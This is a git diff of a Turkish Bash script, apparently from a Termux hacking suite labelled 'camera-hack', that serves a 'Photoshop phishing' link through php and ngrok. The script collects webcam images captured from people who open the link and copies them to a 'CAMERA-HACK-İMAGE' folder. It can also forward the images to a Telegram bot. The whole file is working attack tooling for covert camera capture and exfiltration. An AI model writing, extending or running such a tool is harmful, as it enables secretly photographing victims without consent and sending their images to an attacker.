@@ -45,17 +45,17 @@ fi
 
 if [[ $1 == update ]];then
 	cd files
-	./update.sh update
+	./update.sh update $2
 	exit
 fi
+# COMMANDS SCRİPT CONTROLS #
 
-# BİLDİRİM SCRİPT KONTROLÜ #
-
-if [[ -a files/termuxxtoolssmod ]];then
-	mv files/termuxxtoolssmod $PREFIX/bin
+if [[ -a files/commands/termuxxtoolssmod ]];then
+	mv files/commands/termuxxtoolssmod $PREFIX/bin
+	mv files/commands/link-create $PREFIX/bin
 	chmod 777 $PREFIX/bin/*
 fi
-control=$(ps aux | grep "ngrok" | grep -v grep |grep -o ngrok)
+control=$(ps aux | grep ngrok | grep -v grep |grep -o ngrok)
 if [[ -n $control ]];then
 	killall ngrok
 	killall php
@@ -71,8 +71,8 @@ if [[ -a updates_infos ]];then
 fi
 cd files
 function finish() {
-	control=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
-	if [[ $control == ngrok ]];then
+	control=$(ps aux |grep ngrok |grep -v grep |grep -o http)
+	if [[ -n $control ]];then
 		killall ngrok
 		killall php
 	fi
@@ -87,60 +87,38 @@ while :
 do
 	control=$(ls |grep .png |wc -l)
 	if [[ $control -gt 0 ]];then
+		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
+		if [[ $control == telegram-bot ]];then
+			echo "[✓] RESİMLER ALINDI" > .info
+			termuxxtoolssmod --send
+			echo "sendPhoto .png" > .info
+		else
+			echo "[✓] RESİMLER ALINDI" > .info
+		fi
+		sleep 5
+		killall ngrok
+		killall php
 		clear
-		echo "[✓] RESİM ALINDI" > .info
+		echo
+		echo
+		echo
+		printf "\e[1;32m
+		+-+-+-+-+-+-+-+-+-+-+\e[97m
+
+		$(ls |grep .png |wc -l) ADET RESİM ALINDI\e[32m
+
+		+-+-+-+-+-+-+-+-+-+-+"
+		echo
+		echo
+		echo
 		termuxxtoolssmod --send
-		echo
-		echo
-		echo
-		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
-		echo
-		echo
-		echo
-		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
-		echo
-		echo
-		echo
-		sleep 2
+		mv cam* images
 		exit
 	fi
 done
-}
-dongu2() {
-ls |grep .png |wc -l > .sayi.txt
-while :
-do
-	control1=$(cat .sayi.txt)
-	control2=$(ls |grep .png |wc -l)
-	if [[ $control1 != $kontrol2 ]];then
-		echo -e "$(ls |grep .png |wc -l)" > .sayi.txt
-		clear
-		echo "[✓] RESİM ALINDI" > .info
-		termuxxtoolssmod --send
-		echo
-		echo
-		echo
-		printf "\e[32m[✓]\e[33m $control2\e[97m ADET RESİM BULUNDU"
-		echo
-		echo
-		echo
-		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
-		echo
-		echo
-		echo
-		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
-		echo
-		echo
-		echo
-		sleep 2
-		exit
-	fi
-done
-rm .sayi.txt
-exit
 }
 bulunan() {
-control=$(ls |grep .png |wc -l)
+control=$(ls images |grep .png |wc -l)
 if [[ $control -gt 0 ]];then
 	echo
 	echo
@@ -151,7 +129,7 @@ if [[ $control -gt 0 ]];then
 	echo
 	read -e -p $'\e[97mKAYDEDİLEN ESKİ RESİMLER SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
 	if [[ $sec == e || $sec == E ]];then
-		rm cam*
+		rm images/cam*
 		echo
 		echo
 		echo
@@ -198,11 +176,7 @@ if [[ $control -gt 0 ]];then
 		echo
 		echo
 		sleep 1
-		control=$(basename $(pwd))
-		if [[ $control == photoshop ]];then
-			port="4141"
-		fi
-		bash index.sh -bg -p $port
+		link-create -p
 		echo
 		echo
 		echo
@@ -214,7 +188,7 @@ if [[ $control -gt 0 ]];then
 		echo
 		echo
 		echo
-		dongu2
+		dongu
 
 	else
 		echo
@@ -235,7 +209,7 @@ image() {
 	if [[ ! -a /sdcard/CAMERA-HACK-İMAGE ]];then
 		mkdir /sdcard/CAMERA-HACK-İMAGE
 	fi
-	sayi=$(ls |grep .png |wc -l)
+	sayi=$(ls images |grep .png |wc -l)
 	if [[ $sayi == 0 ]];then
 		echo
 		echo
@@ -249,7 +223,7 @@ image() {
 		bash camera-hack.sh
 		exit
 	fi
-	cp cam* /sdcard/CAMERA-HACK-İMAGE
+	cp images/cam* /sdcard/CAMERA-HACK-İMAGE
 }
 
 printf "
@@ -259,8 +233,6 @@ printf "
 \e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mPHOTOSHOP PHİSHİNG\e[97m
 
 \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[33mRESİMLERİ DOSYALARA KOPYALA\e[97m
-
-\e[31m[\e[97mK\e[31m]\e[97m ────────── \e[33mPHP & NGROK BAĞLANTIYI KES\e[97m
 
 \e[31m[\e[97mA\e[31m]\e[97m ────────── \e[33mBİLDİRİM AYARLARI\e[97m
 
@@ -273,7 +245,7 @@ read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]─�
 if [[ $secim == 1 ]];then
 	cd photoshop
 	bulunan
-	bash index.sh -bg -p 4141
+	link-create -p
 	echo
 	echo
 	echo
@@ -306,34 +278,6 @@ elif [[ $secim == A || $secim == a ]];then
 	cd ..
 	bash $0
 	exit
-elif [[ $secim == k || $secim == K ]];then
-	control=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
-	if [[ $control == 1 ]];then
-		killall php
-		killall ngrok
-		echo
-		echo
-		echo
-		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
-		echo
-		echo
-		echo
-		sleep 2
-		cd ..
-		bash camera-hack.sh
-	else
-		echo
-		echo
-		echo
-		printf "\e[31m[*] \e[33mPHP & NGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
-		echo
-		echo
-		echo
-		sleep 2
-		cd ..
-		bash camera-hack.sh
-		exit
-	fi
 elif [[ $secim == x || $secim == X ]];then
 	echo
 	echo
